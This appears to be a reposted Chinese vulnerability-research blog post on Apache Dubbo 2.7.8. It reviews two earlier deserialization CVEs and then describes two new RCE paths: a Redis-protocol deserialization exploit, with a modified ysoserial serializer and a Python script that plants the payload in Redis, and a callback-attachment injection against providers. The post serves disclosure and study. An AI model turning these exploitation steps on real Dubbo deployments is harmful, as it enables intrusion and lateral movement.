version="1.0" encoding="utf-8"?

# Dubbo多个远程代码执行漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247483983&idx=1&sn=a6e66f14121481e183f07f281e219de2&chksm=fc30c515cb474c034f4001ad48c0479921535bbcea52f9fa9e64b832dfc47fe1cab6ae0531c4&scene=126&sessionid=1681400524#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247483983&idx=1&sn=a6e66f14121481e183f07f281e219de2&chksm=fc30c515cb474c034f4001ad48c0479921535bbcea52f9fa9e64b832dfc47fe1cab6ae0531c4&scene=126&sessionid=1681400524#rd)

  

马上年底了，发现年初定的几个漏洞的KPI还没来得及完成，趁着最近有空赶紧突击一波，之前业务部门被爆过Dubbo的漏洞，干脆就把Dubbo拖过来挖一把。之前没用过Dubbo，既然要挖它就先大体了解了一下，毕竟know it and then hack it。Dubbo是个基于Java的RPC框架，可以实现Java过程的远程调用。话不多说，先本地搞个Demo跑起来看看，Dubbo版本就采用最新的2.7.8

  

### **一、****本地Demo**

先从Git地址

https://github.com/apache/dubbo-samples上下载示例项目，里面有几十个示例，我们随意选取一个dubbo-samples-http，后续以该示例为基础进行Demo开发与漏洞调试。此处示例项目的导入、基本配置、启动、运行步骤不再赘述。

  

#### **1、创建Provider**

Provider可以理解为服务端，我们创建如下Provider：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public interface DemoService {    String sayHello(String name);}public class DemoServiceImpl implements DemoService {
    @Override    public String sayHello(String name) {        System.out.println("[" + newSimpleDateFormat("HH:mm:ss").format(newDate()) + "] Hello " + name + ", request from consumer: " + RpcContext.getContext().getRemoteAddress());        return"Hello " + name + ", response from provider: " + RpcContext.getContext().getLocalAddress();    }}
```

  

该Provider只提供了一个sayHello方法，该方法接受一个string类型参数，启动Provider，如下图：

![](../Images/adcda7658360a32db75a8bd818e1dfd6.png)

**2、创建Consumer**  

Consumer可以理解为客户端，我们创建如下Consumer：

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public class HttpConsumer {
    public static void main(String[] args) throwsException {       ClassPathXmlApplicationContext context = newClassPathXmlApplicationContext("spring/http-consumer.xml");        context.start();
        DemoServicedemoService = (DemoService) context.getBean("demoService");        System.out.println(demoService.sayHello("rebeyond"));    }
```

运行Consumer，如下图：

![](../Images/a6a741b02280a89db56f344f4fd8cb9f.png)

  

Provider的输出：

![](../Images/7df50be0b3795ba89b815d02267eb6a0.png)

可以看到Consumer成功调用了Provider端提供的sayhello方法，Demo运行成功。

  

### **二、历史漏洞**

Demo搭建好以后我们对dubbo的大体工作流程就有了一个比较完整的轮廓了，接下来就是思考攻击面，简单头脑风暴了一下想到了几个关键词：RPC、反射、反序列化、远程代码执行、攻击客户端、攻击服务端。以史为镜*，*可以知兴替，头脑风暴之后，我们简单看下Dubbo之前爆过的几个高危漏洞。

  

#### **1、CVE-2019-17564**

先来看一下漏洞描述：“Apache Dubbo支持多种协议，官方默认为 Dubbo 协议。当用户选择http协议进行通信时，Apache Dubbo 将接受来自消费者远程调用的POST请求并执行一个反序列化的操作。由于此步骤没有任何安全校验，因此可以造成反序列化执行任意代码。”

通过描述可以看出，这是一个简单粗暴的反序列化漏洞，当客户端和服务端的通信采用http协议时，服务端直接对POST过来的二进制数据流进行Java原生反序列化，因此可以根据项目依赖的一些第三方库来构造Gadgets实现RCE。

这个漏洞的修复方案也是比较简单直接，直接把POST请求体的handler由“Java原生反序列化”改为“JsonRpcServer”。

  

**2、CVE-2020-1948**  

漏洞描述：“Dubbo 2.7.6或更低版本采用的默认反序列化方式存在代码执行漏洞，当 Dubbo 服务端暴露时(默认端口：20880)，攻击者可以发送未经验证的服务名或方法名的RPC请求，同时配合附加恶意的参数负载。当恶意参数被反序列化时，它将执行恶意代码。经验证该反序列化漏洞需要服务端存在可以被利用的第三方库，而研究发现极大多数开发者都会使用的某些第三方库存在能够利用的攻击链，攻击者可以利用它们直接对 Dubbo 服务端进行恶意代码执行，影响广泛。”

可以看到，这也是一个反序列化漏洞。这个漏洞的修复方案主要是增加了一个getInvocationWithoutData方法，对恶意的inv对象进行了一个置空操作：

![](../Images/b100624f7e50160d0aff0015aaabaecd.png)

![](../Images/ccaa60c0938b34e5ed838a612d0510f4.png)

了解完上面这两个已知漏洞，接下来我们就开始挖新洞了：）

  

### **三、Dubbo Redis****协议远程代码执行漏洞**

上文提到，Apache Dubbo支持多种协议，列表如下：

![](../Images/1865122699f9caf9b6cf58fe9b07599d.png)

不同的协议是不同的入口分支，我们选择redis协议跟一下，首先改造一下我们的Demo，改成redis协议的版本，Provider做如下修改，根据官网的文档，我们增加get和set方法：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public interface DemoService {    String sayHello(String name);    String get(String key);    String set(String key,Object value);}public class HttpProvider {
    public static void main(String[] args) throwsException {       ClassPathXmlApplicationContext context = newClassPathXmlApplicationContext("spring/http-provider.xml");        context.start();
        System.out.println("dubbo service started");       RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();        Registry registry =registryFactory.getRegistry(URL.valueOf("zookeeper://121.37.161.179:2181"));        registry.register(URL.valueOf("redis://192.168.176.2/org.apache.dubbo.samples.http.api.DemoService?category=providers&dynamic=true&application=http-provider&group=member&loadbalance=consistenthash"));                newCountDownLatch(1).await();    }
}
```

Consumer做如下修改：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public class HttpConsumer {
    public static void main(String[] args) throwsException {       ClassPathXmlApplicationContext context = newClassPathXmlApplicationContext("spring/http-consumer.xml");        context.start();
        DemoServicedemoService = (DemoService) context.getBean("demoService");        String result = demoService.get("rebeyond");    }}
```

程序执行流程为：Consumer向Provider请求demoService的引用，这个引用其实就是个redis服务，然后执行demoService的get方法去redis里面取数据。

定位到redis协议的实现代码

org.apache.dubbo.rpc.protocol.redis.RedisProtocol，如下：

![](../Images/14960c53b26917efd05834fe1202c625.png)

可以看到红框里面在处理set方法时，没有像memcached那样调用原生jedis client的get方法，而是将key的内容作为字节流的形式读取出来并进行了反序列化处理。不过这里负责反序列化的是ObjectInput接口，由于这个接口的实现类比较多，要实际看一下具体是哪个实现类执行的反序列化操作，下断点跟进去看一下：

![](../Images/2b95c102992ea9f15780a1519fe0c080.png)

可以看到oin的类型是JavaObjectInput，JavaObjectInput是dubbo对Java原生ObjectInputStream的一个简单封装，继续跟进oin.readObject：

![](../Images/311d10ffa04389bf43f20bec93fed6fa.png)

直接调用了java.io.ObjectInputStream中的readObject方法来反序列化，没有任何过滤。不过这里要注意一下，我们在构造payload的时候，需要绕过下面这个小坑：

*   
*   
*   
*   

```
byte b =getObjectInputStream().readByte();if (b == 0) {    return null;}
```

后面我们在构造payload的时候，需要在恶意反序列化对象的字节码之前先放一个字节的0数据，才能绕过上面这个校验。

接下来就是构造payload，我在复现历史漏洞的时候看到CVE-2019-17564中利用的是CommonCollections4.0的Gadgets，我们也采用这个链来构造Poc，在生成Poc之前，为了使Poc绕过前面那个坑，需要先对ysoserial.jar做一个简单的改造，如下：

*   
*   
*   
*   
*   

```
public static void serialize(final Object obj, final OutputStream out) throws IOException {    final ObjectOutputStream objOut = new ObjectOutputStream(out);   objOut.writeByte(1);  //add thisline to control the execution flow to subsequent deserialization in dubbo   objOut.writeObject(obj);}
```

重新构建ysoserial.jar后执行如下命令生成payload：

*   

```

```

把payload写入redis：

*   
*   
*   
*   
*   
*   
*   
*   

```
#!/bin/python#coding=utf-8
import redis,binasciir = redis.StrictRedis(host='192.168.176.2', port=6379, db=0)payload=open('/tmp/payload','rb').read()printbinascii.b2a_hex(payload)r.set('rebeyond', payload)
```

  

运行Consumer，payload成功执行：

![](../Images/9148baef92ab5de363b9d2919f082d3a.png)

根据官网文档可知，dubbo不提供redis协议服务的导出，只提供redis协议服务的引用，因此这个漏洞的攻击场景主要用于内网横向移动，当控制了内网一台redis后，批量获取dubbo client主机的权限。

  

### **四、Dubbo callback****远程代码执行漏洞**

打完client不够过瘾，接下来继续打server。

Dubbo推荐的默认通信协议是dubbo协议，下面我们就分析下dubbo协议的入口处理类DubboProtocol，经过一波我注意到如下代码：

![](../Images/2eb403c8d1f14b8ba00b8e8b741fc504.png)

这段代码有两个问题，第一个问题在于logger.warn，我们先看另外一处调用logger.warn的代码：

![](../Images/57448a6da403d4ef4b6f160607f972b6.png)

可以看到，Dubbo在其他地方调用logger.warn的时候都会事先通过isWarnEnabled函数判断下有没有开启log，但是137行这里没有判断，直接无条件执行了logger.warn。

第二个问题在于，这里的inv对象没有通过getInvocationWithoutData方法进行清洗。这两个问题构成了一个漏洞前提，前提有了，下面的问题是怎么控制程序走到这个分支里面。

![](../Images/7f283986bd6982ae8c1c4ae954b99d44.png)

从上图代码可以看出核心的分支控制点在于

inv.getObjectAttachments().get(IS*CALLBACK*SERVICE*INVOKE)**的值，只有当inv.getObjectAttachments().get(IS*CALLBACK*SERVICE*INVOKE)的值为true的时候，才能执行进入这个问题分支。根据CallBack这个关键词，我了解了一下Dubbo执行回调机制，也就是说Consumer在远程调用Provider的方法时，也可以让Provider回过来调用Consumer的方法，这个过程就是回调。我对Demo重新改造一下，做了个callback的版本，Provider侧如下：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public interface CallbackService {
    /**     *这个索引为1的是callback类型。     * dubbo 将基于长连接生成反向代理，就可以在服务端调用客户端逻辑     * @param key     *@param listener     */    void addListener(String key, CallbackListenerlistener);}public class CallbackServiceImpl implements CallbackService {
    private finalMap<String, CallbackListener>listeners;
    public CallbackServiceImpl() {        listeners =newConcurrentHashMap<>();        Thread t = newThread(() -> {            while (true) {                try {                   for (Map.Entry<String, CallbackListener>entry : listeners.entrySet()) {                       try {                            entry.getValue().changed(getChanged(entry.getKey()));                       } catch (Throwable t1) {                            listeners.remove(entry.getKey());                       }                   }                   Thread.sleep(5000); // timely trigger change event                } catch (Throwable t1) {                   t1.printStackTrace();                }            }        });        t.setDaemon(true);        t.start();    }
    @Override    public void addListener(String key, CallbackListener listener){        listeners.put(key, listener);        listener.changed(getChanged(key)); // send notification for change    }
    private String get Changed(String key) {        return"Changed: " + newSimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(newDate());    }}
```

Consumer侧：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
public class HttpConsumer {
    public static void main(String[] args) throwsException {       ClassPathXmlApplicationContext context = newClassPathXmlApplicationContext("spring/http-consumer.xml");        context.start();
       CallbackService callbackService = context.getBean("callbackService",CallbackService.class);        // 增加listener       callbackService.addListener("foo.bar", newCallBackDemo());    }
    static class CallBackDemo implements CallbackListener {
        @Override        public void changed(String msg) {            System.out.println("I am callback:" + msg);        }    }}
```

Demo运行结果如下，Provider成功回调了Consumer的changed方法：

![](../Images/2476206a52a065d1a6c30ac239c0239d.png)

因为Dubbo的Provider和Consumer共用同一套Dubbo的代码，在问题代码处打断点，然后同时运行Provider和Consumer，果然不出意外，Provider没有断下来，Consumer断下来了：

![](../Images/e881b613b7050df8cd685b7b2b6a22d4.png)

由此可知这个漏洞分支只有机会在Consumer侧执行，这个也是意料之中，对Dubbo来说，Consumer调用Provider是正常调用，Provider反过来调用Consumer才叫“回调”，因此Dubbo的流程只存在Provider回调Consumer，不存在Consumer回调Provider。但是我们的目标是Provider，所以需要让Provider把某个正常调用强制作为“回调”。如何判断一个请求是“正调”还是“回调”？前文已经提到，就是

inv.getObjectAttachments().get(ISCALLBACKSERVICEINVOKE)的值为true的时候，即attachments中的isCallBackServiceInvoke值为true的时候。

接下来的目标就是要在Provider侧寻找一个分支，可以改写inv的attachments，尝试在源码中寻找如下调用点：

![](../Images/15c8596b0a768f5b20014344c7301fc9.png)

  

找了一圈没发现key和value同时可控的点，暂时陷入僵局，准备从其他思路突破，再次运行一下callback的Demo并抓包：

![](../Images/ed652e80a7d2647028c11e170cfd12b5.png)

上面的数据流，红色是Consumer发给Provider的，蓝色是Provider返回给Consumer的。当我看到syscallbackarg-1字样的时候，顿时豁然开朗了，之前客户端的断点中，attachments中有一个key就是syscallbackarg-1，也就是说，attachments是用户可控的，经过一波分析，最终定位到Provider侧的如下代码段：

![](../Images/82cd946caed9ec5e38b38db79081bf28.png)

赶紧模拟客户端，在上面那个数据包的基础上，往里塞一个键值对："\_isCallBackServiceInvoke"："true"，在Provider侧上图红框处打上断点，成功断了下来：

![](../Images/dcd2b4d96f21bb8f7bc1f89fb98d32cb.png)

F8步过，可以看到"\_isCallBackServiceInvoke"："true"被成功注入：

![](../Images/4b77bae8bc1621460a979a80508b3a4d.png)

第一个分支搞定以后，我们再看一下这段代码：

![](../Images/7f283986bd6982ae8c1c4ae954b99d44.png)

还需要搞定一个分支，那就是hasMethod的值必须是false。

![](../Images/67ee682cf6fc78f3f80be79118f3993c.png)

  

但是这里methodStr和inv.getMethodName()都是addListener，这里的methodStr是Provider根据Consumer请求体中指定的接口名称来反射获取的，而inv.getMethodName()的值是用户可控的，这两部分如下：

![](../Images/5f20e012625263d8d20bef70686e9a09.png)

尝试将第一个红框的方法名随意改一下，结果发现在请求体decode的时候就报方法不存在的异常，根本走不到构建attachments的流程。这时候只有一个方法，那就是第一个红框中的接口名和方法名同时修改成一个classpath中确实存在的值，并且这个方法还必须要接受一个Object类型的参数方便后续通过参数注入恶意对象，很自然想到我们可以用Dubbo自带的几个默认Service，比如EchoService，这个服务的$echo方法刚好接收一个Object类型参数：

![](../Images/9d9bbcec8a4822221b46390645073021.png)

这样最终methodStr和inv.getMethodName()就分别是addListener和$echo，hasMethod自然为false，成功进入我们想要的漏洞分支：

![](../Images/a25755298497100179b2201672a13a40.png)

![](../Images/1c2bc4756404cf5f07b69ec7adce9962.png)

接下来就是构造inv对象了，参考CVE-2020-1948，这里我们也采用com.sun.rowset.JdbcRowSetImpl和ToStringBean来构造Gadgets，

![](../Images/0f8db8257c66993d26b491c0fa315418.png)

最终成功执行Payload：

![](../Images/4250e38cf700fd0a81a603ea0837ca9c.png)

### **五、小结**

这篇文章主要是给大家分享一下自己的挖洞思路，由于时间很仓促，上文中的一些理解可能存在错误，如有不当之处，希望各位斧正。

 

### **六、参考链接**

1.http://dubbo.apache.org/docs/v2.7/user/references/protocol/

2.https://paper.seebug.org/1264/

3.https://www.cnblogs.com/wh4am1/p/12307848.html